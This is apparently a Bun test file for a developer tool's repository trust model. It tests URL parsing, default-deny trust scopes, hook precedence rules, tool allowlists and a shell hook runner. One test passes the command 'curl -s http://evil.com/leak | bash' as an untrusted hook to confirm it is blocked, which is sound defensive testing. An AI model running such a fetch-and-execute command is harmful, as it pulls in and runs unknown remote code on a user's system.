import { describe, expect, test } from "bun:test";
import {
  parseSourceIdentity,
  evaluateTrust,
  resolveHookExecution,
  isToolAllowed,
} from "../../src/trust";
import type { TrustedScope } from "../../src/config";

describe("Trust Model and Hook Resolution Pure Logic (Phase 16)", () => {
  const sampleScopes: TrustedScope[] = [
    {
      provider: "azure_devops",
      tenant: "dev.azure.com",
      owner: "my-company",
      repos: ["core-platform", "payments", "auth"],
      install: true,
      allowedTools: ["mise", "pnpm", "bun"],
      rules: [
        {
          match: "*",
          hooks: {
            post_checkout: "mise install",
          },
        },
        {
          match: "payments",
          hooks: {
            post_checkout: "mise install && cargo check",
          },
        },
      ],
    },
    {
      provider: "github",
      tenant: "github.com",
      owner: "my-company",
      repos: ["frontend"],
      install: false,
      allowedTools: ["pnpm"],
    },
  ];

  test("parseSourceIdentity extracts provider, tenant, owner, and repo from various URLs", () => {
    const ado = parseSourceIdentity("https://dev.azure.com/my-company/project/_git/payments");
    expect(ado.provider).toBe("azure_devops");
    expect(ado.tenant).toBe("dev.azure.com");
    expect(ado.owner).toBe("my-company");
    expect(ado.repo).toBe("payments");

    const ghHttps = parseSourceIdentity("https://github.com/my-company/frontend.git");
    expect(ghHttps.provider).toBe("github");
    expect(ghHttps.tenant).toBe("github.com");
    expect(ghHttps.owner).toBe("my-company");
    expect(ghHttps.repo).toBe("frontend");

    const ghSsh = parseSourceIdentity("git@github.com:my-company/frontend.git");
    expect(ghSsh.provider).toBe("github");
    expect(ghSsh.tenant).toBe("github.com");
    expect(ghSsh.owner).toBe("my-company");
    expect(ghSsh.repo).toBe("frontend");
  });

  test("evaluateTrust identifies trusted repositories in scope", () => {
    const trusted = evaluateTrust({
      sourceUrl: "https://dev.azure.com/my-company/project/_git/payments",
      trustedScopes: sampleScopes,
    });
    expect(trusted.isTrusted).toBe(true);
    expect(trusted.matchedScope).toBeDefined();
    expect(trusted.matchedScope?.owner).toBe("my-company");
  });

  test("evaluateTrust flags unlisted repositories as untrusted (default-deny)", () => {
    const untrusted = evaluateTrust({
      sourceUrl: "https://github.com/stranger/malicious-repo.git",
      trustedScopes: sampleScopes,
    });
    expect(untrusted.isTrusted).toBe(false);
    expect(untrusted.matchedScope).toBeUndefined();
  });

  test("resolveHookExecution: mount hook override takes top precedence for trusted scopes", () => {
    const result = resolveHookExecution({
      sourceUrl: "https://dev.azure.com/my-company/project/_git/payments",
      hookName: "post_checkout",
      mountHook: "echo 'Custom mount hook'",
      trustedScopes: sampleScopes,
    });

    expect(result.allowed).toBe(true);
    expect(result.command).toBe("echo 'Custom mount hook'");
    expect(result.reason).toBe("trusted_mount_override");
  });

  test("resolveHookExecution: exact repository rule takes precedence over wildcard rule", () => {
    const result = resolveHookExecution({
      sourceUrl: "https://dev.azure.com/my-company/project/_git/payments",
      hookName: "post_checkout",
      trustedScopes: sampleScopes,
    });

    expect(result.allowed).toBe(true);
    expect(result.command).toBe("mise install && cargo check");
    expect(result.reason).toBe("trusted_exact_rule");
  });

  test("resolveHookExecution: wildcard rule is used when no exact rule matches", () => {
    const result = resolveHookExecution({
      sourceUrl: "https://dev.azure.com/my-company/project/_git/core-platform",
      hookName: "post_checkout",
      trustedScopes: sampleScopes,
    });

    expect(result.allowed).toBe(true);
    expect(result.command).toBe("mise install");
    expect(result.reason).toBe("trusted_wildcard_rule");
  });

  test("resolveHookExecution: blocks untrusted hook execution without explicit consent", () => {
    const result = resolveHookExecution({
      sourceUrl: "https://github.com/evil/malicious-repo.git",
      hookName: "post_checkout",
      mountHook: "curl -s http://evil.com/leak | bash",
      trustedScopes: sampleScopes,
      explicitConsent: false,
    });

    expect(result.allowed).toBe(false);
    expect(result.command).toBeUndefined();
    expect(result.reason).toBe("untrusted_blocked");
  });

  test("resolveHookExecution: permits untrusted hook execution only when explicit consent is provided", () => {
    const result = resolveHookExecution({
      sourceUrl: "https://github.com/evil/safe-repo.git",
      hookName: "post_checkout",
      mountHook: "echo 'I consent to this hook'",
      trustedScopes: sampleScopes,
      explicitConsent: true,
    });

    expect(result.allowed).toBe(true);
    expect(result.command).toBe("echo 'I consent to this hook'");
    expect(result.reason).toBe("explicit_consent");
  });

  test("isToolAllowed validates allowed tools against scope", () => {
    const scope = sampleScopes[0];
    expect(isToolAllowed(scope, "mise")).toBe(true);
    expect(isToolAllowed(scope, "pnpm")).toBe(true);
    expect(isToolAllowed(scope, "cargo")).toBe(false);

    const noInstallScope = sampleScopes[1];
    expect(isToolAllowed(noInstallScope, "pnpm")).toBe(false);
  });

  test("shell.runHook executes command and exposes DEV_* environment variables", async () => {
    const { runHook } = await import("../../src/shell");
    const isWin = process.platform === "win32";
    const cmd = isWin ? "echo %DEV_ROOT%:%DEV_WORKSPACE%" : "echo $DEV_ROOT:$DEV_WORKSPACE";

    const res = await runHook(cmd, {
      env: {
        DEV_ROOT: "C:/fake/dev",
        DEV_WORKSPACE: "payment-fix",
        DEV_MOUNT_PATH: "C:/fake/dev/ws/payment-fix/payments",
        DEV_SOURCE: "https://dev.azure.com/my-company/project/_git/payments",
        DEV_REVISION: "main",
      },
    });

    expect(res.exitCode).toBe(0);
    expect(res.stdout).toContain("C:/fake/dev:payment-fix");
  });

  test("shell.runHook captures non-zero exit code on failure", async () => {
    const { runHook } = await import("../../src/shell");
    const isWin = process.platform === "win32";
    const cmd = isWin ? "cmd.exe /c exit 42" : "sh -c 'exit 42'";

    const res = await runHook(cmd);
    expect(res.exitCode).toBe(42);
  });
});
